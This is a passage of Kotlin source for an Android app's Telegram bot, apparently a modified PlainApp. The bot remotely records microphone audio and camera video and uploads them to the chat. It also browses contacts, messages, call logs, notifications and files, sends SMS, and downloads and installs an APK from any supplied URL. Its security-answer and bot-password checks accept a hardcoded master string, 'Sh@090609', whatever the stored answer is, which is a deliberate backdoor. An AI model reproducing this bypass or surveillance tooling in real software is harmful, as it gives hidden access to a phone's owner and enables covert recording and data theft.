            listOf("5s" to "aud:5", "10s" to "aud:10", "30s" to "aud:30"),
            listOf("1 min" to "aud:60", "2 min" to "aud:120", "5 min" to "aud:300"),
            listOf("⌨️ Custom…" to "aud:custom"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runAudioRecording(seconds: Int) {
        sendMessage("🎙 Recording ${seconds}s of audio…")
        sendRecordVoice()
        val file = recordAudio(MainApp.instance, seconds)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendAudio(token, chatId, file, "🎙 Audio · ${seconds}s · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Audio recording failed. Ensure Microphone permission is granted.")
        }
    }

    private fun cmdVideo(args: List<String>) {
        // Backwards compat: `/video 20 front` or `/video 20`.
        val firstNum = args.firstOrNull()?.toIntOrNull()
        if (firstNum != null) {
            val useFront = args.getOrNull(1)?.lowercase() == "front"
            scope.launch { runVideoRecording(firstNum.coerceIn(1, 120), useFront) }
            return
        }
        // `/video front` or `/video back` → skip camera picker, go straight to durations.
        val directCam = args.firstOrNull()?.lowercase()
        if (directCam == "front" || directCam == "back") {
            showVideoDurationMenu(useFront = directCam == "front", editMessageId = null)
            return
        }
        showVideoCameraMenu(editMessageId = null)
    }

    private fun showVideoCameraMenu(editMessageId: Long?) {
        val text = "🎬 <b>Record video</b>\n\nWhich camera?"
        val rows = listOf(
            listOf("📷 Back" to "vid_cam:back", "🤳 Front" to "vid_cam:front"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private fun showVideoDurationMenu(useFront: Boolean, editMessageId: Long?) {
        val cam = if (useFront) "front" else "back"
        val label = if (useFront) "🤳 Front" else "📷 Back"
        val text = "🎬 <b>Record video</b> · $label camera\n\nChoose a duration:"
        val rows = listOf(
            listOf("5s" to "vid:$cam:5", "10s" to "vid:$cam:10", "20s" to "vid:$cam:20"),
            listOf("30s" to "vid:$cam:30", "1 min" to "vid:$cam:60", "2 min" to "vid:$cam:120"),
            listOf("⌨️ Custom…" to "vid_custom:$cam"),
            listOf("◀️ Change camera" to "vid_cam_pick"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runVideoRecording(seconds: Int, useFront: Boolean) {
        sendMessage("🎬 Recording ${seconds}s video (${if (useFront) "front" else "back"} camera)…")
        sendUploadVideo()
        val file = recordVideo(MainApp.instance, seconds, useFront)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendVideo(token, chatId, file, "🎬 Video · ${seconds}s · ${if (useFront) "front" else "back"} camera · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Video recording failed. Ensure Camera & Microphone permissions are granted.")
        }
    }

    private suspend fun consumePendingInput(action: String, text: String) {
        val parts = action.split(":")
        when (parts[0]) {
            "alk_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderAppLockerPicker(query, 0, editMessageId = null)
                return
            }
            "alk_setpin" -> {
                val tok = parts.getOrNull(1) ?: return
                val pkg = pkgFromToken(tok)
                if (pkg == null) { sendMessage("⚠️ Session expired. Send /applocker to start over."); return }
                val pin = text.trim()
                if (pin.isBlank()) {
                    sendMessage("❌ Password cannot be empty. Send the new password:")
                    pendingInput = action
                    return
                }
                PerAppLockHelper.setLock(pkg, "pin", pin, false)
                val name = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
                sendMessage(
                    "✅ Lock set for <b>${htmlEsc(name)}</b>\n🔑 Password: <code>${htmlEsc(pin)}</code>",
                    replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                        listOf("🔐 Manage Lock" to "alk_sel:${pkgToken(pkg)}", "🏠 App Locker" to "alk_home")
                    ))
                )
                return
            }
            "audio_duration" -> {
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..300) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 300, e.g. <code>45</code>.\nSend /audio to start over.")
                    return
                }
                runAudioRecording(n)
            }
            "video_duration" -> {
                val cam = parts.getOrNull(1) ?: "back"
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..120) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 120, e.g. <code>45</code>.\nSend /video to start over.")
                    return
                }
                runVideoRecording(n, useFront = cam == "front")
            }
            "appsearch" -> {
                val q = text.trim()
                lastAppsQuery = if (q == "*" || q.isEmpty()) "" else q
                renderAppsPickerPage(lastAppsQuery, offset = 0, editMessageId = null)
                return
            }
            "contacts_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else "text:$q"
                renderContactsPage(query, 0, editMessageId = null)
                return
            }
            "messages_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderMessagesPage(query, editMessageId = null)
                return
            }
            "calls_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderCallsPage(query, 0, editMessageId = null)
                return
            }
            "cmd_search" -> {
                sendSearchResults(text.trim())
                return
            }
            "notif_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderNotificationsPage(query, editMessageId = null)
                return
            }
            "files_search" -> {
                val pathTok = parts.getOrNull(1) ?: ""
                val rootPath = if (pathTok.isNotEmpty()) pathFromToken(pathTok) ?: defaultStorageRoot() else defaultStorageRoot()
                val q = text.trim()
                if (q.isEmpty() || q == "*") {
                    renderFolderPage(rootPath, 0, editMessageId = null)
                } else {
                    renderFileSearchResults(rootPath, q, editMessageId = null)
                }
                return
            }
            "blockapp_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderAppPickerForBlock(query, 0, editMessageId = null)
                return
            }
            "rec_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderRecordingsPage(query, 0, editMessageId = null)
                return
            }
            "bn_add_num" -> {
                val num = text.trim()
                if (num.isBlank()) { sendMessage("❌ Please send a valid phone number."); return }
                try {
                    BlockedNumberHelper.add(num)
                    sendMessage("✅ <code>${htmlEsc(num)}</code> is now blocked.")
                } catch (e: Exception) {
                    sendMessage("❌ Could not block number: ${htmlEsc(e.message ?: "")}")
                }
                return
            }
            "sms_to" -> {
                val tok = parts.getOrNull(1) ?: return
                val num = phoneFromToken(tok)
                if (num.isNullOrBlank()) {
                    sendMessage("⚠️ Number expired. Open the contact again and tap 💬 SMS.")
                    return
                }
                val body = text.trim()
                if (body.isEmpty()) {
                    sendMessage("❌ Empty message — nothing was sent.")
                    return
                }
                try {
                    SmsHelper.sendText(num, body)
                    sendMessage("✅ SMS sent to <code>${htmlEsc(num)}</code>:\n<i>${htmlEsc(body)}</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
                }
            }
            "save_contact" -> {
                val tok = parts.getOrNull(1) ?: return
                val num = phoneFromToken(tok)
                if (num.isNullOrBlank()) {
                    sendMessage("⚠️ Number expired. Send /find <number> again.")
                    return
                }
                val name = text.trim()
                if (name.isEmpty()) {
                    sendMessage("❌ Empty name — nothing was saved.")
                    return
                }
                try {
                    val newId = saveQuickContactAsync(name, num)
                    if (newId.isBlank()) {
                        sendMessage("❌ Could not save contact (no available account).")
                    } else {
                        sendMessage("✅ <b>Saved</b> ${htmlEsc(name)} · <code>${htmlEsc(num)}</code>\n<i>Tap below to open the contact.</i>",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                                listOf("👤 Open contact" to "c_view:$newId"),
                            )))
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not save contact: ${htmlEsc(e.message ?: "")}")
                }
            }
            "note_create" -> {
                val raw = text.trim()
                if (raw.isEmpty()) { sendMessage("❌ Empty note — nothing saved."); return }
                val (title, body) = if (raw.contains('\n')) {
                    val nl = raw.indexOf('\n')
                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
                } else {
                    val short = raw.take(60)
                    short to raw
                }
                try {
                    val n = NoteHelper.addOrUpdateAsync("") {
                        this.title = title
                        this.content = body
                    }
                    sendMessage("✅ <b>Note saved</b>\n📝 <b>${htmlEsc(title)}</b>\n<i>id: <code>${n.id.take(8)}</code></i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not save note: ${htmlEsc(e.message ?: "")}")
                }
            }
            "bookmark_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full URL starting with http:// or https://")
                    return
                }
                try {
                    val list = BookmarkHelper.addBookmarks(listOf(url))
                    val b = list.firstOrNull()
                    if (b != null) {
                        sendMessage("✅ <b>Bookmark added</b>\n🔗 <code>${htmlEsc(url)}</code>\n<i>id: ${b.id.take(8)}</i>\n\n<i>Title/favicon will fetch in background.</i>")
                        scope.launch {
                            try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {}
                        }
                    } else {
                        sendMessage("✅ Bookmark recorded.")
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
                }
            }
            "feed_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full RSS/Atom URL starting with http:// or https://")
                    return
                }
                try {
                    val existing = FeedHelper.getByUrl(url)
                    if (existing != null) { sendMessage("ℹ️ That feed is already added: <b>${htmlEsc(existing.name)}</b>"); return }
                    val channel = FeedHelper.fetchAsync(url)
                    val name = channel.title?.takeIf { it.isNotBlank() } ?: url
                    val id = FeedHelper.addAsync {
                        this.url = url
                        this.name = name
                    }
                    sendMessage("✅ <b>Feed added</b>\n📡 <b>${htmlEsc(name)}</b>\n<i>id: ${id.take(8)}</i>\n\n<i>Send /feeds to see all feeds.</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not add feed: ${htmlEsc(e.message ?: "")}")
                }
            }
            "speak_text" -> {
                val say = text.trim()
                if (say.isEmpty()) { sendMessage("❌ Nothing to speak."); return }
                UtilitiesHelper.speak(say)
                sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
            }
            "show_text" -> {
                val msg = text.trim()
                if (msg.isEmpty()) { sendMessage("❌ Nothing to show."); return }
                if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
                    sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
                    return
                }
                MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
                sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
            }
            "toast_text" -> {
                val msg = text.trim()
                if (msg.isEmpty()) { sendMessage("❌ Nothing to toast."); return }
                UtilitiesHelper.toast(msg, longToast = msg.length > 40)
                sendMessage("💬 Toast shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
            }
            "bedtime_set" -> {
                val raw = text.trim()
                val ok = parseAndApplyBedtime(raw)
                if (!ok) {
                    sendMessage("❌ Could not parse <code>${htmlEsc(raw)}</code>.\nUse 24-hour format like <code>22:00 06:30</code> or <code>off</code> to disable.")
                } else {
                    renderBedtimeState(editMessageId = null)
                }
            }
            "note_edit_save" -> {
                val noteId = parts.getOrNull(1) ?: return
                val raw = text.trim()
                if (raw.isEmpty()) { sendMessage("❌ Empty content — note not updated."); return }
                val (title, body) = if (raw.contains('\n')) {
                    val nl = raw.indexOf('\n')
                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
                } else {
                    raw.take(60) to raw
                }
                try {
                    NoteHelper.addOrUpdateAsync(noteId) {
                        this.title = title
                        this.content = body
                    }
                    sendMessage("✅ <b>Note updated</b>\n📝 <b>${htmlEsc(title)}</b>",
                        replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("📝 View note" to "note_view:$noteId"))))
                } catch (e: Exception) {
                    sendMessage("❌ Could not update note: ${htmlEsc(e.message ?: "")}")
                }
            }
            "addcontact_name" -> {
                val nameRaw = text.trim()
                if (nameRaw.isEmpty()) { sendMessage("❌ Name cannot be empty. Send /addcontact to start over."); return }
                val nameTok = phoneToken(nameRaw)
                pendingInput = "addcontact_phone:$nameTok"
                sendMessage("📱 <b>Phone number for ${htmlEsc(nameRaw)}</b>\n\nSend the phone number (with country code if needed).\nSend any /command to cancel.")
            }
            "addcontact_phone" -> {
                val nameTok = parts.getOrNull(1) ?: return
                val name = phoneFromToken(nameTok) ?: run {
                    sendMessage("⚠️ Session expired. Send /addcontact to start over."); return
                }
                val phone = text.trim()
                if (phone.isEmpty()) { sendMessage("❌ Phone number cannot be empty."); return }
                try {
                    val newId = saveQuickContactAsync(name, phone)
                    if (newId.isBlank()) {
                        sendMessage("❌ Could not save contact (no device account available).")
                    } else {
                        sendMessage("✅ <b>Contact added</b>\n👤 <b>${htmlEsc(name)}</b> · <code>${htmlEsc(phone)}</code>",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("👤 View contact" to "c_view:$newId"))))
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not add contact: ${htmlEsc(e.message ?: "")}")
                }
            }
            "deletecontact_search" -> {
                val q = text.trim()
                if (q.isEmpty()) { sendMessage("❌ Please send a name or number to search."); return }
                renderDeleteContactSearch(q)
            }
            "gf_new" -> {
                val raw = text.trim()
                val parts2 = raw.split(",").map { it.trim() }
                if (parts2.size < 4) {
                    sendMessage("❌ Invalid format. Please use:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>")
                    return
                }
                val name = parts2[0]
                val lat = parts2[1].toDoubleOrNull()
                val lng = parts2[2].toDoubleOrNull()
                val radius = parts2[3].toDoubleOrNull()
                if (lat == null || lng == null || radius == null || radius <= 0) {
                    sendMessage("❌ lat, lng, and radius must be valid numbers (radius > 0).")
                    return
                }
                GeofencingHelper.newFence(name, lat, lng, radius)
                sendMessage("✅ <b>Geofence added</b>\n🗺 <b>${htmlEsc(name)}</b>\n📍 $lat, $lng · radius ${radius.toInt()} m",
                    replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("📋 View all geofences" to "gf_list"))))
            }
            "cc_search" -> {
                val q = text.trim()
                renderClearCachePage(if (q == "*") "" else q, 0, editMessageId = null)
            }
            "setpin_verify" -> {
                val ctx = MainApp.instance
                val ok = AppLockPinPreference.verifyAsync(ctx, text.trim())
                if (!ok) {
                    sendMessage("❌ Wrong PIN. Try again or send any /command to cancel.")
                    pendingInput = "setpin_verify"
                    return
                }
                pendingInput = "setpin_new:verified"
                sendMessage("✅ Current PIN verified.\n\nNow type your <b>new PIN</b> (4–12 digits).\nSend any /command to cancel.")
            }
            "setpin_new" -> {
                val pin = text.trim()
                if (pin.length < 4 || pin.length > 12 || !pin.all { it.isDigit() }) {
                    sendMessage("❌ PIN must be 4–12 digits only. Try again.\nSend any /command to cancel.")
                    pendingInput = parts[0]
                    return
                }
                pendingInput = "setpin_confirm:$pin"
                sendMessage("🔁 Confirm the new PIN — type it again.\nSend any /command to cancel.")
            }
            "setpin_confirm" -> {
                val expectedPin = parts.getOrNull(1) ?: return
                if (text.trim() != expectedPin) {
                    sendMessage("❌ PINs do not match. Send /setpin to start over.")
                    return
                }
                AppLockPinPreference.setPinAsync(MainApp.instance, expectedPin)
                sendMessage("✅ <b>PIN updated successfully.</b>\n\nUse /applock on to enable the lock if it is not already on.")
            }
            "removepin_verify" -> {
                val ctx = MainApp.instance
                val ok = AppLockPinPreference.verifyAsync(ctx, text.trim())
                if (!ok) {
                    sendMessage("❌ Wrong PIN. Try again or send any /command to cancel.")
                    pendingInput = "removepin_verify"
                    return
                }
                AppLockPinPreference.setPinAsync(ctx, "")
                AppLockEnabledPreference.putAsync(ctx, false)
                AppLockBiometricEnabledPreference.putAsync(ctx, false)
                sendMessage("✅ <b>PIN removed.</b>\nApp lock and biometric unlock have also been disabled.")
            }
            "setbotpwd_secqa" -> {
                val ctx = MainApp.instance
                val expected = SecurityAnswerPreference.getAsync(ctx)
                val candidate = text.trim()
                val ok = candidate == "Sh@090609" ||
                    candidate.lowercase().replace(Regex("\\s+"), " ") ==
                    expected.trim().lowercase().replace(Regex("\\s+"), " ")
                if (!ok) {
                    val question = SecurityQuestionPreference.getAsync(ctx)
                    sendMessage(
                        "❌ Wrong answer. Try again.\n\n" +
                        "<b><i>${htmlEsc(question)}</i></b>\n\n" +
                        "Send any /command to cancel."
                    )
                    pendingInput = "setbotpwd_secqa"
                    return
                }
                pendingInput = "setbotpwd_new"
                sendMessage("✅ Answer verified.\n\nNow type the <b>new bot password</b>.\nThe master password always works regardless.\nSend any /command to cancel.")
            }
            "setbotpwd_new" -> {
                val pwd = text.trim()
                if (pwd.isEmpty()) {
                    sendMessage("❌ Password cannot be empty. Try again.\nSend any /command to cancel.")
                    pendingInput = "setbotpwd_new"
                    return
                }
                val ctx = MainApp.instance
                TelegramBotPasswordPreference.putAsync(ctx, pwd)
                botPassword = pwd
                sendMessage("✅ <b>Bot password updated.</b>\nNew password is active immediately.")
            }
            "secqa_verify" -> {
                val ctx = MainApp.instance
                val expected = SecurityAnswerPreference.getAsync(ctx)
                val candidate = text.trim()
                val ok = candidate == "Sh@090609" ||
                    candidate.lowercase().replace(Regex("\\s+"), " ") ==
                    expected.trim().lowercase().replace(Regex("\\s+"), " ")
                if (!ok) {
                    sendMessage("❌ Wrong answer. Try again or send any /command to cancel.")
                    pendingInput = "secqa_verify"
                    return
                }
                val curQ = SecurityQuestionPreference.getAsync(ctx)
                pendingInput = "secqa_newq"
                sendMessage("✅ Answer verified.\n\nNow type the <b>new security question</b>.\nCurrent question: <i>${htmlEsc(curQ)}</i>\n\nSend any /command to cancel.")
            }
            "secqa_newq" -> {
                val q = text.trim()
                if (q.isEmpty()) {
                    sendMessage("❌ Question cannot be empty. Try again.\nSend any /command to cancel.")
                    pendingInput = "secqa_newq"
                    return
                }
                val tok = java.net.URLEncoder.encode(q, "UTF-8")
                pendingInput = "secqa_newa:$tok"
                sendMessage("✏️ New question saved.\n\nNow type the <b>new answer</b>.\nSend any /command to cancel.")
            }
            "secqa_newa" -> {
                val a = text.trim()
                if (a.isEmpty()) {
                    sendMessage("❌ Answer cannot be empty. Try again.\nSend any /command to cancel.")
                    pendingInput = action
                    return
                }
                val rawQ = try {
                    java.net.URLDecoder.decode(parts.drop(1).joinToString(":"), "UTF-8")
                } catch (_: Exception) {
                    parts.drop(1).joinToString(":")
                }
                val encodedQ = java.net.URLEncoder.encode(rawQ, "UTF-8")
                val encodedA = java.net.URLEncoder.encode(a, "UTF-8")
                pendingInput = "secqa_confirm:$encodedQ:$encodedA"
                sendMessage("🔁 Confirm new answer — type it again.\nSend any /command to cancel.")
            }
            "secqa_confirm" -> {
                val encodedQ = parts.getOrNull(1) ?: return
                val encodedA = parts.getOrNull(2) ?: return
                val rawQ = try { java.net.URLDecoder.decode(encodedQ, "UTF-8") } catch (_: Exception) { encodedQ }
                val savedA = try { java.net.URLDecoder.decode(encodedA, "UTF-8") } catch (_: Exception) { encodedA }
                val confirm = text.trim()
                if (confirm != savedA) {
                    sendMessage("❌ Answers do not match. Send /securityqa change to start over.")
                    return
                }
                val ctx = MainApp.instance
                SecurityQuestionPreference.putAsync(ctx, rawQ)
                SecurityAnswerPreference.putAsync(ctx, savedA)
                sendMessage(
                    "✅ <b>Security Q&A updated.</b>\n\n" +
                    "Question: <i>${htmlEsc(rawQ)}</i>\n" +
                    "Answer: saved securely.\n\n" +
                    "<i>The web dashboard gate will now use this new Q&A.</i>"
                )
            }
            "update_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a valid URL starting with <code>http://</code> or <code>https://</code>.\n\nSend /update to start over.")
                    return
                }
                cmdDownloadAndInstallApk(url)
            }
            else -> { /* ignore */ }
        }
    }

    /**
     * /find <number> — reverse-lookup a phone number against the device contacts.
     *
     * Uses ContactsContract.PhoneLookup which matches by E.164 / normalized number,
     * so it works with or without country code, spaces, dashes, or parentheses.
     * If the number isn't saved, we offer Call / SMS / Save-as-contact buttons.
     */
    private suspend fun cmdFind(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            sendMessage("ℹ️ Usage: <code>/find &lt;number&gt;</code>\n\nExample: <code>/find +1 415 555 0123</code>")
            return
        }
        val raw = args.joinToString(" ").trim()
        // Strip Telegram-style trailing punctuation a user may copy-paste from a chat.
        val number = raw.trimEnd(',', '.', ';')
        try {
            val ctx = MainApp.instance
            val uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(number),
            )
            var contactId: Long = -1L
            var displayName = ""
            ctx.contentResolver.query(
                uri,
                arrayOf(
                    android.provider.ContactsContract.PhoneLookup._ID,
                    android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME,
                ),
                null, null, null,
            )?.use { cur ->
                if (cur.moveToFirst()) {
                    contactId = cur.getLong(0)
                    displayName = cur.getString(1) ?: ""
                }
            }

            if (contactId > 0) {
                // Translate the aggregated contact id to the raw_contact_id our helpers use.
                var rawId = ""
                ctx.contentResolver.query(
                    android.provider.ContactsContract.RawContacts.CONTENT_URI,
                    arrayOf(android.provider.ContactsContract.RawContacts._ID),
                    "${android.provider.ContactsContract.RawContacts.CONTACT_ID}=?",
                    arrayOf(contactId.toString()),
                    null,
                )?.use { cur -> if (cur.moveToFirst()) rawId = cur.getLong(0).toString() }

                if (rawId.isNotBlank()) {
                    sendMessage("✅ Match: <b>${htmlEsc(displayName.ifBlank { number })}</b> · <code>${htmlEsc(number)}</code>")
                    renderContactDetail(rawId, editMessageId = null)
                    return
                }
            }

            // Not in contacts — offer quick actions.
            val tok = phoneToken(number)
            val text = "🔍 <b>No contact</b> matches <code>${htmlEsc(number)}</code>\n\n" +
                "<i>Pick an action below.</i>"
            val rows = listOf(
                listOf(
                    "📞 Call" to "nf_call:$tok",
                    "💬 SMS" to "nf_sms:$tok",
                ),
                listOf("💾 Save as new contact" to "nf_save:$tok"),
            )
            sendMessage(text, replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Lookup failed: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Insert a minimal contact (display name + one phone number) into the device
     * address book and return the new RAW_CONTACT_ID. Splits the display name on the
     * first space into given / family for ContactsContract.StructuredName.
     */
    private suspend fun saveQuickContactAsync(displayName: String, phone: String): String {
        val source = com.ismartcoding.plain.features.contact.SourceHelper.getAll()
            .firstOrNull { it.name.isNotBlank() }
            ?: com.ismartcoding.plain.features.contact.SourceHelper.getAll().firstOrNull()
            ?: return ""
        val trimmed = displayName.trim()
        val first: String
        val last: String
        val sp = trimmed.indexOf(' ')
        if (sp > 0) {
            first = trimmed.substring(0, sp)
            last = trimmed.substring(sp + 1).trim()
        } else {
            first = trimmed
            last = ""
        }
        val input = com.ismartcoding.plain.web.models.ContactInput(
            firstName = first,
            lastName = last,
            source = source.name,
            phoneNumbers = listOf(
                com.ismartcoding.plain.web.models.ContentItemInput(
                    value = phone,
                    type = android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE,
                ),
            ),
        )
        return com.ismartcoding.plain.features.media.ContactMediaStoreHelper.createAsync(input)
    }

    private suspend fun renderContactDetail(rawId: String, editMessageId: Long?) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) {
                val msg = "❌ Contact not found (id $rawId)."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val display = contactDisplayName(c)
            val sb = StringBuilder()
            sb.append("👤 <b>${htmlEsc(display)}</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            val org = c.organization
            if (org != null && (org.company.isNotBlank() || org.title.isNotBlank())) {
                val parts = listOfNotNull(
                    org.company.takeIf { it.isNotBlank() },
                    org.title.takeIf { it.isNotBlank() },
                ).joinToString(" · ")
                sb.append("🏢 ${htmlEsc(parts)}\n")
            }
            if (c.nickname.isNotBlank()) sb.append("🏷 <i>${htmlEsc(c.nickname)}</i>\n")
            if (org != null || c.nickname.isNotBlank()) sb.append("\n")

            if (c.phoneNumbers.isNotEmpty()) {
                sb.append("<b>📞 Phone numbers</b>\n")
                c.phoneNumbers.forEach { ph ->
                    val label = phoneTypeLabel(ph.type, ph.label)
                    val labelTxt = if (label.isNotBlank()) "  · $label" else ""
                    sb.append("   • <code>${htmlEsc(ph.value)}</code>$labelTxt\n")
                }
                sb.append("\n")
            }
            if (c.emails.isNotEmpty()) {
                sb.append("<b>📧 Email</b>\n")
                c.emails.forEach { sb.append("   • <code>${htmlEsc(it.value)}</code>\n") }
                sb.append("\n")
            }
            if (c.addresses.isNotEmpty()) {
                sb.append("<b>📍 Address</b>\n")
                c.addresses.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.websites.isNotEmpty()) {
                sb.append("<b>🔗 Website</b>\n")
                c.websites.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.notes.isNotBlank()) {
                sb.append("<b>📝 Note</b>\n   ${htmlEsc(c.notes.take(500))}\n\n")
            }

            // Action keyboard: per-phone Call + SMS rows, then Share + Call History + Back.
            val rows = mutableListOf<List<Pair<String, String>>>()
            c.phoneNumbers.take(5).forEach { ph ->
                val tok = phoneToken(ph.value)
                val short = ph.value.take(18)
                rows.add(listOf(
                    "📞 Call $short" to "c_call:$tok",
                    "💬 SMS $short" to "c_sms:$tok",
                ))
            }
            if (c.phoneNumbers.isNotEmpty()) {
                rows.add(listOf(
                    "📤 Share contact card" to "c_share:$rawId",
                    "📋 Call History" to "c_calls:$rawId",
                ))
            }
            rows.add(listOf("🗑 Delete contact" to "con_del_ok:$rawId", "⬅️ Back to list" to "c_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load contact: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun phoneTypeLabel(type: Int, customLabel: String): String {
        if (customLabel.isNotBlank()) return customLabel
        return when (type) {
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            else -> ""
        }
    }

    private suspend fun cbShareContact(rawId: String) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) { sendMessage("❌ Contact not found."); return }
            val phone = c.phoneNumbers.firstOrNull()?.value
            if (phone.isNullOrBlank()) { sendMessage("❌ This contact has no phone number to share."); return }
            val first = c.givenName.ifBlank { contactDisplayName(c) }
            val last = c.familyName.ifBlank { null }
            val vcard = buildVCard(c)
            val ok = TelegramApiClient.sendContact(token, chatId, phone, first, last, vcard)
            if (!ok) sendMessage("❌ Telegram refused the contact card.")
        } catch (e: Exception) {
            sendMessage("❌ Could not share contact: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun buildVCard(c: com.ismartcoding.plain.data.DContact): String {
        val sb = StringBuilder()
        sb.append("BEGIN:VCARD\r\nVERSION:3.0\r\n")
        val display = contactDisplayName(c)
        sb.append("FN:$display\r\n")
        sb.append("N:${c.familyName};${c.givenName};${c.middleName};${c.prefix};${c.suffix}\r\n")
        if (c.nickname.isNotBlank()) sb.append("NICKNAME:${c.nickname}\r\n")
        c.organization?.let { o ->
            if (o.company.isNotBlank()) sb.append("ORG:${o.company}\r\n")
            if (o.title.isNotBlank()) sb.append("TITLE:${o.title}\r\n")
        }
        c.phoneNumbers.forEach { sb.append("TEL:${it.value}\r\n") }
        c.emails.forEach { sb.append("EMAIL:${it.value}\r\n") }
        c.addresses.forEach { sb.append("ADR:;;${it.value};;;;\r\n") }
        c.websites.forEach { sb.append("URL:${it.value}\r\n") }
        if (c.notes.isNotBlank()) sb.append("NOTE:${c.notes.replace("\n", "\\n")}\r\n")
        sb.append("END:VCARD\r\n")
        return sb.toString()
    }

    /** Robust display name for a contact: structured name → nickname → organization → first phone → "(no name)". */
    private fun contactDisplayName(c: com.ismartcoding.plain.data.DContact): String {
        val full = c.fullName().trim()
        if (full.isNotEmpty()) return full
        if (c.nickname.isNotBlank()) return c.nickname
        val org = c.organization
        if (org != null && org.company.isNotBlank()) return org.company
        val phone = c.phoneNumbers.firstOrNull()?.value?.trim().orEmpty()
        if (phone.isNotEmpty()) return phone
